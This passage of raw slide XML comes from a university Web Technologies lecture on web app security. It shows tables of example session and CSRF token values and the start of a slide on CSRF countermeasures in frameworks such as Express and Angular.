                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:solidFill>
                      <a:srgbClr val="D70031"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="229235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dirty="0" sz="1200" spc="-1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Value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43180">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:solidFill>
                      <a:srgbClr val="D70031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dirty="0" sz="1200" spc="-20">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>csrf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36830">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F8E7E8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="229235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dirty="0" sz="1200" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>x5è1€</a:t>
                      </a:r>
                      <a:endParaRPr sz="1200">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="0" marR="0" marB="0" marT="36830">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F8E7E8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="273685"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dirty="0" sz="1200" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>usename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37465">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D7003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9235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dirty="0" sz="1200" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>gavinelli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37465">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D70031"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="D7003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pSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="object 17" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8904478" y="3593338"/>
            <a:ext cx="2274570" cy="1318895"/>
            <a:chOff x="8904478" y="3593338"/>
            <a:chExt cx="2274570" cy="1318895"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="object 18" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8910828" y="3599688"/>
              <a:ext cx="2261870" cy="1306195"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2261870" h="1306195">
                  <a:moveTo>
                    <a:pt x="2214753" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="46863" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="13716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3679" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="46862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1259205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3679" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46863" y="1306068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="1306068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="1259205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="46862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="13716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00916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9" name="object 19" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8910828" y="3599688"/>
              <a:ext cx="2261870" cy="1306195"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2261870" h="1306195">
                  <a:moveTo>
                    <a:pt x="0" y="46862"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3679" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="13716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46863" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="13716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="46862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="1259205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="1306068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46863" y="1306068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3679" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1259205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="46862"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="00392A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0" name="object 20" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9003538" y="3633978"/>
            <a:ext cx="205613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solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>id:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>4f4…ssd2</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="21" name="object 21" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8984742" y="3976623"/>
            <a:ext cx="2065655" cy="287020"/>
            <a:chOff x="8984742" y="3976623"/>
            <a:chExt cx="2065655" cy="287020"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="22" name="object 22" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8991092" y="3982973"/>
              <a:ext cx="2052955" cy="274320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2052954" h="274320">
                  <a:moveTo>
                    <a:pt x="2052624" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1026337" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="274320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1026287" y="274320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2052624" y="274320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2052624" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00916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3" name="object 23" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8984742" y="3982973"/>
              <a:ext cx="2065655" cy="274320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2065654" h="274320">
                  <a:moveTo>
                    <a:pt x="0" y="274319"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2065401" y="274319"/>
                  </a:lnTo>
                </a:path>
                <a:path w="2065654" h="274320">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2065401" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="00916D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aphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="24" name="object 24" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8984742" y="3970273"/>
          <a:ext cx="2141855" cy="8280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889635"/>
                <a:gridCol w="1163319"/>
              </a:tblGrid>
              <a:tr h="280035"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dirty="0" sz="1200" spc="-25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Key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43815">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:solidFill>
                      <a:srgbClr val="00916D"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="229235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dirty="0" sz="1200" spc="-1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Value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43815">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:solidFill>
                      <a:srgbClr val="00916D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dirty="0" sz="1200" spc="-20">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>csrf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37465">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="E7EDEB"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="229235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dirty="0" sz="1200" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>D64#a</a:t>
                      </a:r>
                      <a:endParaRPr sz="1200">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="0" marR="0" marB="0" marT="37465">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="E7EDEB"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="273685"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dirty="0" sz="1200" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>usename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37465">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916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9235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dirty="0" sz="1200" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>gabonzo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37465">
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916D"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="00916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object 25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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="object 26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dirty="0" spc="-25"/>
              <a:t>26</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>26</a:t>
            </a:fld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30"/>
              <a:t>IMPLEMENTING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-175"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-165"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t>COUNTERMEASURES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962050" y="1496596"/>
            <a:ext cx="9785350" cy="3458210"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="48895" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="385"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Most</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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frameworks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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include</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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protection</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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capabilities</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="245"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Many</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>middlewares</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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exist</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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for</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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Express</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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u="sng" sz="2400" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>tiny-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="219"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Angular</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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includes</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>countermeasures</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Spring</a:t>
            </a:r>
            <a:r>
